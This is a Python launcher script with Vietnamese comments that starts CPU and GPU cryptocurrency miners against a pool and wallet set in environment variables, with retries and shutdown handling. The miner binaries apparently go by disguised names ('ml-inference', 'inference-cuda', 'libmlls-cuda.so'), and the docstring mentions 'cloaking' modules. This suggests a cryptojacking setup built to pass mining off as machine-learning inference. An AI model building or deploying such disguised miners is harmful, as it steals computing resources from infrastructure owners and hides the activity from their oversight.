"""
start_mining.py

Entrypoint chính để khởi động toàn bộ hệ thống khai thác tiền điện tử.
Thực hiện các bước thiết lập môi trường, khởi động các module quản lý tài nguyên và cloaking, và bắt đầu quá trình khai thác.
"""

import os
import sys
import subprocess
import threading
import signal
import time
from pathlib import Path

from mining_environment.scripts.logging_config import setup_logging

# Import các module thiết lập môi trường, system_manager
from mining_environment.scripts import setup_env, system_manager

# Thiết lập đường dẫn tới thư mục logs
LOGS_DIR = os.getenv('LOGS_DIR', '/app/mining_environment/logs')
os.makedirs(LOGS_DIR, exist_ok=True)

# Thiết lập logging với logging_config.py
logger = setup_logging(
    'start_mining',
    Path(LOGS_DIR) / 'start_mining.log',
    'INFO'
)

# Sự kiện dừng để xử lý graceful shutdown
stop_event = threading.Event()
# Sự kiện đánh dấu "đã bắt đầu" (nếu cần đồng bộ các bước)
mining_started_event = threading.Event()

def signal_handler(signum, frame):
    """
    Xử lý tín hiệu dừng (SIGINT, SIGTERM).
    Đánh dấu sự kiện dừng để các thread có thể dừng lại một cách nhẹ nhàng.
    """
    logger.info(f"Nhận tín hiệu dừng ({signum}). Đang dừng hệ thống khai thác...")
    stop_event.set()

# Đăng ký xử lý tín hiệu
signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)

def initialize_environment():
    """
    Thiết lập môi trường khai thác bằng cách gọi setup_env.py.
    """
    logger.info("Bắt đầu thiết lập môi trường khai thác.")
    try:
        setup_env.setup()
        logger.info("Thiết lập môi trường thành công.")
    except Exception as e:
        logger.error(f"Lỗi khi thiết lập môi trường: {e}")
        sys.exit(1)

def start_system_manager():
    """
    Khởi động quản lý tài nguyên bằng cách gọi system_manager.py.
    """
    logger.info("Khởi động Resource Manager.")
    try:
        system_manager.start()
        logger.info("Resource Manager đã được khởi động.")
    except Exception as e:
        logger.error(f"Lỗi khi khởi động Resource Manager: {e}")
        stop_event.set()
        try:
            system_manager.stop()
        except Exception as stop_error:
            logger.error(f"Lỗi khi dừng Resource Manager sau lỗi: {stop_error}")

def is_mining_process_running(mining_process):
    """
    Kiểm tra xem quá trình khai thác có đang chạy không.
    """
    return mining_process and mining_process.poll() is None

def start_mining_process(retries=3, delay=5):
    """
    Khởi động quá trình khai thác CPU bằng cách gọi ml-inference với cơ chế thử lại.
    """
    ml_executable = os.getenv('ML_COMMAND', '/usr/local/bin/ml-inference')
    if not ml_executable:
        logger.error("Biến môi trường ML_COMMAND không được thiết lập.")
        stop_event.set()
        return None

    if not os.path.isfile(ml_executable):
        logger.error(f"Không tìm thấy tệp thực thi khai thác tại: {ml_executable}")
        stop_event.set()
        return None
    if not os.access(ml_executable, os.X_OK):
        logger.error(f"Tệp thực thi khai thác không có quyền thực thi: {ml_executable}")
        stop_event.set()
        return None

    # Lấy địa chỉ máy chủ và địa chỉ ví từ biến môi trường (CPU)
    mining_server_cpu = os.getenv('MINING_SERVER_CPU')
    mining_wallet_cpu = os.getenv('MINING_WALLET_CPU')
    if not mining_server_cpu:
        logger.error("Biến môi trường MINING_SERVER_CPU không được thiết lập.")
        stop_event.set()
        return None
    if not mining_wallet_cpu:
        logger.error("Biến môi trường MINING_WALLET_CPU không được thiết lập.")
        stop_event.set()
        return None

    # Định nghĩa lệnh khai thác CPU
    ml_command = [
        ml_executable,
        '--donate-level', '1',
        '-o', mining_server_cpu,
        '-u', mining_wallet_cpu,
        '-a', 'rx/0',
        '--no-huge-pages',
        '--tls'
    ]

    for attempt in range(1, retries + 1):
        logger.info(f"Thử khởi chạy quá trình khai thác CPU (Cố gắng {attempt}/{retries})...")
        try:
            mining_process = subprocess.Popen(
                ml_command,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            logger.info(f"Quá trình khai thác CPU đã được khởi động với PID: {mining_process.pid}")

            time.sleep(2)  # Chờ ngắn để xem có crash ngay không
            if mining_process.poll() is not None:
                stdout, stderr = mining_process.communicate()
                logger.error(
                    f"Quá trình khai thác CPU kết thúc ngay khi khởi động (mã trả về: {mining_process.returncode})."
                )
                if stdout:
                    logger.error(f"CPU STDOUT: {stdout.decode().strip()}")
                if stderr:
                    logger.error(f"CPU STDERR: {stderr.decode().strip()}")
                mining_process = None
            else:
                logger.info("Quá trình khai thác CPU đang chạy.")
                mining_started_event.set()
                return mining_process

        except Exception as e:
            logger.error(f"Lỗi khi khởi động quá trình khai thác CPU: {e}")
            mining_process = None

        if attempt < retries:
            logger.info(f"Đang đợi {delay} giây trước khi thử lại...")
            time.sleep(delay)

    logger.error("Tất cả các cố gắng khởi chạy quá trình khai thác CPU đã thất bại.")
    stop_event.set()
    return None

def start_gpu_mining_process(retries=3, delay=5):
    """
    Khởi động quá trình khai thác GPU với cơ chế thử lại.
    """
    cuda_executable = os.getenv('CUDA_COMMAND', '/usr/local/bin/inference-cuda')
    if not cuda_executable:
        logger.error("Biến môi trường CUDA_COMMAND (GPU) không được thiết lập.")
        stop_event.set()
        return None

    if not os.path.isfile(cuda_executable):
        logger.error(f"Không tìm thấy tệp thực thi khai thác GPU tại: {cuda_executable}")
        stop_event.set()
        return None
    if not os.access(cuda_executable, os.X_OK):
        logger.error(f"Tệp thực thi khai thác GPU không có quyền thực thi: {cuda_executable}")
        stop_event.set()
        return None

    # Lấy biến môi trường dành cho GPU
    mining_server_gpu = os.getenv('MINING_SERVER_GPU')
    mining_wallet_gpu = os.getenv('MINING_WALLET_GPU')
    cuda_loader = os.getenv('MLLS_CUDA', '/usr/local/bin/libmlls-cuda.so')
    if not mining_server_gpu:
        logger.error("Biến môi trường MINING_SERVER_GPU không được thiết lập.")
        stop_event.set()
        return None
    if not mining_wallet_gpu:
        logger.error("Biến môi trường MINING_WALLET_GPU không được thiết lập.")
        stop_event.set()
        return None
    if not cuda_loader:
        logger.error("Biến môi trường MLLS_CUDA không được thiết lập.")
        stop_event.set()
        return None

    gpu_command = [
        cuda_executable,
        '--algo', 'kawpow',
        '--cuda',
        f'--cuda-loader={cuda_loader}',
        '-o', mining_server_gpu,
        '-u', mining_wallet_gpu,
        '-p', 'x',
        '--tls'
    ]

    for attempt in range(1, retries + 1):
        logger.info(f"Thử khởi chạy quá trình khai thác GPU (Cố gắng {attempt}/{retries})...")
        try:
            gpu_process = subprocess.Popen(
                gpu_command,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            logger.info(f"Quá trình khai thác GPU đã được khởi động với PID: {gpu_process.pid}")

            time.sleep(2)
            if gpu_process.poll() is not None:
                stdout, stderr = gpu_process.communicate()
                logger.error(f"Quá trình khai thác GPU kết thúc ngay (mã trả về: {gpu_process.returncode}).")
                if stdout:
                    logger.error(f"GPU STDOUT: {stdout.decode().strip()}")
                if stderr:
                    logger.error(f"GPU STDERR: {stderr.decode().strip()}")
                gpu_process = None
            else:
                logger.info("Quá trình khai thác GPU đang chạy.")
                return gpu_process

        except Exception as e:
            logger.error(f"Lỗi khi khởi động quá trình khai thác GPU: {e}")
            gpu_process = None

        if attempt < retries:
            logger.info(f"Đang đợi {delay} giây trước khi thử lại (GPU)...")
            time.sleep(delay)

    logger.error("Tất cả nỗ lực khởi chạy quá trình khai thác GPU đều thất bại.")
    stop_event.set()
    return None

def main():
    logger.info("===== Bắt đầu hoạt động khai thác tiền điện tử =====")

    # Bước 1: Thiết lập môi trường
    initialize_environment()

    # Bước 2: Khởi động khai thác CPU
    cpu_process = start_mining_process(retries=3, delay=5)
    if not is_mining_process_running(cpu_process):
        logger.error("Quá trình khai thác CPU không khởi động thành công. Dừng hệ thống.")
        stop_event.set()
        system_manager.stop()
        sys.exit(1)

    # Bước 2b: Thử khởi động GPU nếu có cấu hình
    gpu_process = None
    if os.getenv('MINING_SERVER_GPU') and os.getenv('MINING_WALLET_GPU'):
        gpu_process = start_gpu_mining_process(retries=3, delay=5)
        if os.getenv('REQUIRE_GPU', 'false').lower() == 'true':
            if not is_mining_process_running(gpu_process):
                logger.error("GPU mining được yêu cầu (REQUIRE_GPU=true) nhưng không khởi động thành công. Dừng hệ thống.")
                stop_event.set()
                system_manager.stop()
                sys.exit(1)
        else:
            if not is_mining_process_running(gpu_process):
                logger.warning("GPU mining không thể khởi động, vẫn tiếp tục CPU mining...")

    # Bước 3: Khởi động Resource Manager trong thread riêng
    resource_thread = threading.Thread(target=start_system_manager, daemon=True)
    try:
        resource_thread.start()
    except Exception as e:
        logger.error(f"Lỗi khi khởi động Resource Manager: {e}")
        stop_event.set()
        system_manager.stop()
        sys.exit(1)

    # Bước 4: Vòng lặp chờ tín hiệu dừng, kiểm tra CPU & GPU
    try:
        while not stop_event.is_set():
            # Kiểm tra CPU
            if cpu_process:
                retcode_cpu = cpu_process.poll()
                if retcode_cpu is not None:
                    logger.warning(f"Quá trình khai thác CPU đã kết thúc (mã trả về: {retcode_cpu}). Dừng hệ thống.")
                    stop_event.set()

            # Kiểm tra GPU
            if gpu_process:
                retcode_gpu = gpu_process.poll()
                if retcode_gpu is not None:
                    logger.warning(f"Quá trình khai thác GPU đã kết thúc (mã trả về: {retcode_gpu}). Dừng hệ thống.")
                    stop_event.set()

            time.sleep(1)
    except KeyboardInterrupt:
        logger.info("Đã nhận KeyboardInterrupt. Đang dừng hệ thống khai thác...")
        stop_event.set()
    finally:
        logger.info("Đang dừng các thành phần khai thác...")

        # Dừng CPU mining
        try:
            if cpu_process and cpu_process.poll() is None:
                cpu_process.terminate()
                cpu_process.wait(timeout=10)
                logger.info("Quá trình khai thác CPU đã được dừng.")
        except Exception as e:
            logger.error(f"Lỗi khi dừng quá trình khai thác CPU: {e}")

        # Dừng GPU mining
        try:
            if gpu_process and gpu_process.poll() is None:
                gpu_process.terminate()
                gpu_process.wait(timeout=10)
                logger.info("Quá trình khai thác GPU đã được dừng.")
        except Exception as e:
            logger.error(f"Lỗi khi dừng quá trình khai thác GPU: {e}")

        # Dừng Resource Manager
        try:
            system_manager.stop()
            logger.info("Đã dừng tất cả các quản lý tài nguyên.")
        except Exception as e:
            logger.error(f"Lỗi khi dừng các quản lý tài nguyên: {e}")

        # Chờ thread dừng nếu chưa hoàn tất
        if resource_thread.is_alive():
            resource_thread.join(timeout=5)
            if resource_thread.is_alive():
                logger.error("Thread Resource Manager không thể dừng hoàn toàn.")

        logger.info("===== Hoạt động khai thác tiền điện tử đã dừng thành công =====")


if __name__ == "__main__":
    main()

